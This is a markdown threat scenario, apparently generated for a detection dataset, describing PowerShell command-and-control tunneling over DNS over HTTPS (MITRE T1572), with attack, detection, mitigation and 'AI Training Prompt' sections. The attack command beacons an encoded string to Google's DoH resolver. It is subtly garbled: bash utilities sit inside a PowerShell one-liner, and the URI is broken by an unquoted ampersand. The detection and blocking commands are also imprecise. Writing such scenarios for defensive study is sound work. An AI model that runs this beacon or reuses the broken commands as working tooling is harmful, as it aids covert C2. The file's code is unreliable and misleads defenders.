---
type: campaign
scenario_id: 457
tactic: Command and Control
technique: "T1572: Protocol Tunneling"
technique_id: T1572
tags: [campaign, lotl, command_and_control]
---

# Using PowerShell to tunnel C2 via DNS over HTTPS (DoH).

## Threat Description
Using PowerShell to tunnel C2 via DNS over HTTPS (DoH).

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://dns.google/dns-query?name=$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)&type=TXT -Method GET | Out-Null"
```

## Detection Logic
Monitor DoH traffic: `tshark -Y 'tcp.port == 443' | grep dns.google`; PowerShell DoH: `wmic process where name='powershell.exe' get commandline | findstr dns.google`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block DoH: `netsh advfirewall firewall add rule name='Block DoH' dir=out action=block remoteip=8.8.8.8,8.8.4.4`.

## AI Training Prompt
Train AI to detect PowerShell DoH-based DNS tunneling by analyzing HTTPS requests to DoH resolvers, base64-encoded subdomains, and TXT query patterns; suggest DoH blocking.

## References
- MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
